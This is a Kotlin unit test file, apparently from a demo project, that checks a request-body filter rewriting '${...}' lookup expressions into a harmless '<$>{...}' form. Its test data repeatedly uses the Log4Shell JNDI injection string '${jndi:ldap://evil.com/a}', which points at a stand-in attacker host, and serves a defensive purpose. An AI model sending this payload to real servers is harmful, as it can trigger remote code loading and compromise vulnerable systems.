package com.vladkrava.replacefilterdemo.utils

import org.junit.jupiter.api.Assertions
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.Arguments
import org.junit.jupiter.params.provider.MethodSource

internal class ReplaceUtilsTest {

    @ParameterizedTest(name = "contentForReplacing should return {1} for {0}")
    @MethodSource("getDataForContentForReplacingTest")
    fun `should provide valid Map for replacing when invoking contentForReplacing with given Arguments`(
        givenValue: String,
        expectedResult: Map<String, String>
    ) {
        Assertions.assertEquals(expectedResult, contentForReplacing(givenValue))
    }

    @ParameterizedTest(name = "replaceRequestBody should return {1} for {0}")
    @MethodSource("getDataForReplaceRequestBodyTest")
    fun `should provide valid ReplaceResult when invoking replaceRequestBody with given Arguments`(
        givenRequestBody: ByteArray,
        expectedReplaceRequestBody: ReplaceRequestBody
    ) {
        Assertions.assertEquals(expectedReplaceRequestBody, replaceRequestBody(givenRequestBody))

    }

    companion object {
        @JvmStatic
        fun getDataForReplaceRequestBodyTest(): List<Arguments> {
            return listOf(
                Arguments.of(
                    "{\"username\": \"Test\"}".toByteArray(),
                    ReplaceRequestBody("{\"username\": \"Test\"}".toByteArray(), false)
                ),
                Arguments.of(
                    "{\"username\": \"\${jndi:ldap://evil.com/a}\"}".toByteArray(),
                    ReplaceRequestBody("{\"username\": \"<\$>{jndi:ldap://evil.com/a}\"}".toByteArray(), true)
                ),
                Arguments.of(
                    "{\"username\": \"\${jndi:ldap://evil.com/a}\", \"\${test}\": \"HELLO\", \"\${test#2}!!!\": {\"name\": \"admin\", \"age\": \"\${666}\"}, \"country_code\": 777}".toByteArray(),
                    ReplaceRequestBody(
                        "{\"username\": \"<\$>{jndi:ldap://evil.com/a}\", \"<\$>{test}\": \"HELLO\", \"<\$>{test#2}!!!\": {\"name\": \"admin\", \"age\": \"<\$>{666}\"}, \"country_code\": 777}".toByteArray(),
                        true
                    )
                ),
            )
        }

        @JvmStatic
        fun getDataForContentForReplacingTest(): List<Arguments> {
            return listOf(

                // One match
                Arguments.of(
                    "\${jndi:ldap://evil.com/a}",
                    mapOf("\${jndi:ldap://evil.com/a}" to "<\$>{jndi:ldap://evil.com/a}")
                ),
                Arguments.of(
                    "TEST \${jndi:ldap://evil.com/a} TEST",
                    mapOf("\${jndi:ldap://evil.com/a}" to "<\$>{jndi:ldap://evil.com/a}")
                ),
                Arguments.of(
                    "test\${jndi:ldap://evil.com/a}test",
                    mapOf("\${jndi:ldap://evil.com/a}" to "<\$>{jndi:ldap://evil.com/a}")
                ),
                Arguments.of("\${}", mapOf("\${}" to "<\$>{}")),

                // Multiple match
                Arguments.of("\${}\${}", mapOf("\${}" to "<\$>{}")),
                Arguments.of("\${test1} \${test2}", mapOf("\${test1}" to "<\$>{test1}", "\${test2}" to "<\$>{test2}")),

                // No match
                Arguments.of("\$ {}", emptyMap<String, String>()),
                Arguments.of("{jndi:ldap://evil.com/a}", emptyMap<String, String>()),
                Arguments.of("jndi:ldap://evil.com/a}", emptyMap<String, String>()),
                Arguments.of("\${jndi:ldap://evil.com/a", emptyMap<String, String>()),

                )
        }
    }
}